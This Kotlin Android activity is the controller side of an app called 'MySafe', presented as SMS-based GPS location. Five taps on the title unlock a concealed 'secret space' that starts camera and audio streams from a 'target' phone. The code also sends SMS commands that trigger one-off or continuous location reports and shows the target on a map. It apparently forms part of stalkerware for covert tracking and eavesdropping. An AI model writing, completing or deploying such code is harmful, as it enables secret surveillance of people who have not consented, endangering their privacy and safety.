package com.mysafe.mysafe

import android.Manifest
import android.content.*
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.osmdroid.config.Configuration
import org.osmdroid.tileprovider.tilesource.TileSourceFactory
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {
    private lateinit var tvTitre: TextView
    private lateinit var etNumeroCible: EditText
    private lateinit var btnPosition: Button
    private lateinit var btnSuivi: Button
    private lateinit var btnStopGps: Button
    private lateinit var layoutSecret: LinearLayout
    private lateinit var btnCamera: Button
    private lateinit var btnAudio: Button
    private lateinit var btnStopStream: Button
    private lateinit var mapView: MapView
    private lateinit var tvStatut: TextView
    private lateinit var tvJournal: TextView

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var monNumero: String = ""
    private var numeroCible: String = ""
    private var secretOuvert = false
    private var compteurClics = 0
    private var dernierClic = 0L
    private var userMarker: Marker? = null
    private var remoteMarker: Marker? = null
    private val DEFAULT = GeoPoint(47.4728, -0.5416)

    private val PERMS = mutableListOf(
        Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS, Manifest.permission.RECEIVE_BOOT_COMPLETED
    ).apply { 
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(c: Context?, i: Intent?) {
            val msg = i?.getStringExtra("sms_message")
            val exp = i?.getStringExtra("sender_number")
            if (msg != null && exp != null) runOnUiThread { traiterReception(msg, exp) }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        initViews()
        demandPermissions()
        setupLocalisation()
        setupCarte()
        recupererMonNumero()
        enregistrerReceiver()
        PermanentStreamService.statusCallback = { runOnUiThread { tvStatut.text = it } }
        journal("✅ Pret — Entre un numero !")
    }

    private fun initViews() {
        tvTitre = findViewById(R.id.tvTitre)
        etNumeroCible = findViewById(R.id.etNumeroCible)
        btnPosition = findViewById(R.id.btnPosition)
        btnSuivi = findViewById(R.id.btnSuivi)
        btnStopGps = findViewById(R.id.btnStopGps)
        layoutSecret = findViewById(R.id.layoutSecret)
        btnCamera = findViewById(R.id.btnCamera)
        btnAudio = findViewById(R.id.btnAudio)
        btnStopStream = findViewById(R.id.btnStopStream)
        mapView = findViewById(R.id.mapView)
        tvStatut = findViewById(R.id.tvStatut)
        tvJournal = findViewById(R.id.tvJournal)

        // 5 clics sur le titre = ouverture/fermeture secret
        tvTitre.setOnClickListener {
            val maintenant = System.currentTimeMillis()
            if (maintenant - dernierClic > 800) compteurClics = 0
            dernierClic = maintenant
            compteurClics++
            if (compteurClics >= 5) {
                secretOuvert = !secretOuvert
                layoutSecret.visibility = if (secretOuvert) View.VISIBLE else View.GONE
                tvTitre.text = if (secretOuvert) "🔓 MySafe — Espace Secret OUVERT" else "🔒 MySafe — GPS par SMS"
                compteurClics = 0
                Toast.makeText(this, if (secretOuvert) "✅ Secret ouvert" else "🔒 Secret ferme", Toast.LENGTH_SHORT).show()
            }
        }

        btnPosition.setOnClickListener { demanderPosition() }
        btnSuivi.setOnClickListener { demarrerSuivi() }
        btnStopGps.setOnClickListener { arreterSuivi() }
        btnCamera.setOnClickListener { demanderCamera() }
        btnAudio.setOnClickListener { demanderAudio() }
        btnStopStream.setOnClickListener { arreterStream() }

        layoutSecret.visibility = View.GONE
    }

    private fun recupererMonNumero() {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            monNumero = normaliser(tm.line1Number ?: "")
        }
        SmsReceiver.myPhoneNumber = monNumero
    }

    private fun numeroValide(): Boolean {
        val brut = etNumeroCible.text.toString().trim()
        if (brut.isEmpty()) {
            Toast.makeText(this, "Entre un numero d'abord !", Toast.LENGTH_SHORT).show()
            return false
        }
        numeroCible = normaliser(brut)
        if (monNumero.isNotEmpty() && numeroCible == monNumero) {
            Toast.makeText(this, "Ceci est VOTRE numero ! Entre celui de l'autre telephone.", Toast.LENGTH_LONG).show()
            return false
        }
        return true
    }

    private fun demanderPosition() {
        if (!numeroValide()) return
        envoyerCommande("!!POSITION")
        journal("📍 Demande de position a $numeroCible")
        Toast.makeText(this, "✅ Demande envoyee !", Toast.LENGTH_SHORT).show()
    }

    private fun demarrerSuivi() {
        if (!numeroValide()) return
        envoyerCommande("!!DEMARRER")
        journal("📡 Suivi continu demarre — $numeroCible")
        Toast.makeText(this, "✅ Suivi actif !", Toast.LENGTH_SHORT).show()
    }

    private fun arreterSuivi() {
        if (!numeroValide()) return
        envoyerCommande("!!STOP")
        journal("⏹️ Suivi arrete")
        Toast.makeText(this, "✅ Suivi arrete", Toast.LENGTH_SHORT).show()
    }

    private fun demanderCamera() {
        if (!numeroValide()) return
        val intent = Intent(this, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_DEMARRER_RECEPTION
        startForegroundServiceSafe(intent)
        journal("📷 Camera demande a $numeroCible")
        Toast.makeText(this, "✅ Connexion camera...", Toast.LENGTH_SHORT).show()
    }

    private fun demanderAudio() {
        if (!numeroValide()) return
        val intent = Intent(this, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_DEMARRER_RECEPTION
        startForegroundServiceSafe(intent)
        journal("🔊 Audio demande a $numeroCible")
        Toast.makeText(this, "✅ Ecoute en cours...", Toast.LENGTH_SHORT).show()
    }

    private fun arreterStream() {
        val intent = Intent(this, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_ARRETER
        startForegroundServiceSafe(intent)
        journal("⏹️ Streaming arrete")
        Toast.makeText(this, "✅ Stream arrete", Toast.LENGTH_SHORT).show()
    }

    private fun envoyerCommande(commande: String) {
        val svc = Intent(this, MySafeAgentService::class.java)
        svc.action = MySafeAgentService.ACTION_SEND_COMMAND
        svc.putExtra("target_number", numeroCible)
        svc.putExtra("command", commande)
        startForegroundServiceSafe(svc)
    }

    private fun traiterReception(msg: String, expediteur: String) {
        if (!msg.startsWith("!!") || msg in listOf("!!POSITION", "!!DEMARRER", "!!STOP")) return
        val parts = msg.removePrefix("!!").split(",")
        val lat = parts.getOrNull(0)?.toDoubleOrNull()
        val lon = parts.getOrNull(1)?.toDoubleOrNull()
        if (lat != null && lon != null && !(lat == 0.0 && lon == 0.0)) {
            journal("📍 $expediteur → $lat, $lon")
            afficherSurCarte(lat, lon)
            Toast.makeText(this, "✅ Position recue !", Toast.LENGTH_SHORT).show()
        } else {
            journal("❌ Reponse invalide: $msg")
        }
    }

    private fun afficherSurCarte(lat: Double, lon: Double) {
        val pt = GeoPoint(lat, lon)
        remoteMarker?.let { mapView.overlays.remove(it) }
        remoteMarker = Marker(mapView).apply {
            position = pt
            title = "CIBLE"
            icon = ContextCompat.getDrawable(this@MainActivity, android.R.drawable.ic_menu_compass)
        }
        remoteMarker?.let { mapView.overlays.add(it) }
        mapView.controller.animateTo(pt)
    }

    private fun setupLocalisation() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        if (aPermis(Manifest.permission.ACCESS_FINE_LOCATION)) {
            fusedLocationClient.lastLocation.addOnSuccessListener { loc ->
                loc?.let {
                    val pt = GeoPoint(it.latitude, it.longitude)
                    userMarker?.let { mapView.overlays.remove(it) }
                    userMarker = Marker(mapView).apply {
                        position = pt
                        title = "MOI"
                        icon = ContextCompat.getDrawable(this@MainActivity, android.R.drawable.ic_menu_mylocation)
                    }
                    userMarker?.let { mapView.overlays.add(it) }
                }
            }
        }
    }

    private fun setupCarte() {
        try {
            Configuration.getInstance().apply {
                osmdroidBasePath = File(getExternalFilesDir(null), "osmdroid")
                osmdroidTileCache = File(getExternalFilesDir(null), "osmdroid/tiles")
                userAgentValue = "MySafe-App"
            }
            mapView.apply {
                setTileSource(TileSourceFactory.MAPNIK)
                setMultiTouchControls(true)
                controller.setZoom(10.0)
                controller.setCenter(DEFAULT)
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Carte: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun enregistrerReceiver() {
        val filter = IntentFilter("com.mysafe.mysafe.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(smsReceiver, filter)
        }
    }

    private fun journal(texte: String) {
        val h = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
        tvJournal.text = "[$h] $texte\n\n${tvJournal.text}"
    }

    private fun normaliser(s: String): String {
        return s.replace("\\s".toRegex(), "").replace("-", "").replace(".", "")
            .replace("(", "").replace(")", "")
            .let {
                if (it.startsWith("0") && it.length == 10) "+33${it.substring(1)}"
                else if (it.startsWith("+")) it
                else it
            }
    }

    private fun aPermis(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun demandPermissions() {
        val manquants = PERMS.filter { !aPermis(it) }.toTypedArray()
        if (manquants.isNotEmpty()) ActivityCompat.requestPermissions(this, manquants, 1001)
    }

    private fun startForegroundServiceSafe(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        } catch (e: Exception) { Log.e("MySafe", "Service: ${e.message}") }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(smsReceiver) } catch (e: Exception) {}
    }
}
